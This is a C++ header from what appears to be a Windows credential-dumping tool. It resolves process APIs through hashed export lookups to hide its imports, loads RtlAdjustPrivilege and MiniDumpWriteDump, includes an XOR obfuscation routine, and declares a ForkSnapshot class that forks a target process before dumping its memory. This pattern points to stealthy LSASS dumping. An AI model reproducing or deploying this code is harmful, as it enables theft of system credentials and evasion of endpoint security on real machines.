#pragma once
#ifndef PCH_H
#define PCH_H
#endif
#include <Windows.h>
#include <winternl.h>
#define RCAST reinterpret_cast
#define SCAST static_cast
#define CCAST const_cast
#ifdef _DEBUG
#include <cstdio>
#define DBGPRINT(msg, ...) printf(msg"\n", __VA_ARGS__)
#else
#define DBGPRINT(x, ...)
#endif

#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004

#pragma comment(lib, "ntdll.lib")



extern "C"
{
    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtCreateProcessEx(
            _Out_ PHANDLE ProcessHandle,
            _In_ ACCESS_MASK DesiredAccess,
            _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
            _In_ HANDLE ParentProcess,
            _In_ ULONG Flags,
            _In_opt_ HANDLE SectionHandle,
            _In_opt_ HANDLE DebugPort,
            _In_opt_ HANDLE ExceptionPort,
            _In_ ULONG JobMemberLevel
        );
}

DWORD calcMyHash(char* data) {
	DWORD hash = 0x35;
	for (int i = 0; i < strlen(data); i++) {
		hash += data[i] + (hash << 1);
	}
	return hash;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
	PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
	PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)
		((LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
	PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
	PWORD fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

	for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
		LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

		if (calcMyHash(pFuncName) == myHash) {
			return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
		}
	}
	return nullptr;
}

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
	ULONG Privilege, BOOL Enable,
	BOOL CurrentThread, PULONG Enabled);

_RtlAdjustPrivilege MRtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
    GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");

typedef LPVOID(WINAPI* _HeapAlloc)(
    HANDLE hHeap , DWORD  dwFlags,
    SIZE_T dwBytes);

_HeapAlloc MHeapAlloc = (_HeapAlloc)GetProcAddress(
    GetModuleHandleW(L"Kernel32.dll"), "HeapAlloc");

typedef HANDLE(WINAPI* _CreateToolhelp32Snapshot)(
    DWORD dwFlags, DWORD th32ProcessID);

HMODULE mcmod = LoadLibrary(L"KERNEL32.dll");
LPVOID mcaddr = getAPIAddr(mcmod, 26440446880565);
_CreateToolhelp32Snapshot MCreateToolhelp32Snapshot = (_CreateToolhelp32Snapshot)mcaddr;

typedef BOOL(WINAPI* _Process32FirstW)(
    HANDLE hSnapshot, LPPROCESSENTRY32W lppe);

HMODULE fimod = LoadLibrary(L"KERNEL32.dll");
LPVOID fiaddr = getAPIAddr(fimod, 1410569976);
_Process32FirstW MProcess32FirstW = (_Process32FirstW)fiaddr;

typedef BOOL(WINAPI* _Process32NextW)(
    HANDLE hSnapshot, LPPROCESSENTRY32W lppe);

HMODULE mpmod = LoadLibrary(L"KERNEL32.dll");
LPVOID mpaddr = getAPIAddr(mpmod, 470190531);
_Process32NextW MProcess32NextW = (_Process32NextW)mpaddr;

typedef HANDLE(WINAPI* _OpenProcess)(
    DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);


HMODULE opmod = LoadLibrary(L"KERNEL32.dll");
LPVOID opaddr = getAPIAddr(opmod, 17260444);
_OpenProcess MOpenProcess = (_OpenProcess)opaddr;

typedef BOOL(WINAPI* _MiniDumpWriteDump)(
    HANDLE hProcess, DWORD ProcessId, 
    HANDLE hFile, MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam, 
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, 
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

_MiniDumpWriteDump MMiniDumpWriteDump = (_MiniDumpWriteDump)GetProcAddress(
    LoadLibraryA("Dbghelp.dll"), "MiniDumpWriteDump");


extern char * Xorcrypt(char* content, DWORD length ,char* secretKey)
{
    for (UINT i = 0; i < length; i++)
    {
        content[i] ^= secretKey[i % sizeof(secretKey)];
    }

    return content;
}




class ForkSnapshot
{
	HANDLE TargetProcess;
	HANDLE CurrentSnapshotProcess;
public:
	ForkSnapshot(
		_In_ HANDLE TargetProcess
	);
	ForkSnapshot(
		_In_ DWORD TargetProcessId
	);
	~ForkSnapshot(
		VOID
	);

	HANDLE TakeSnapshot(
		VOID
	);
	BOOL CleanSnapshot(
		VOID
	);
};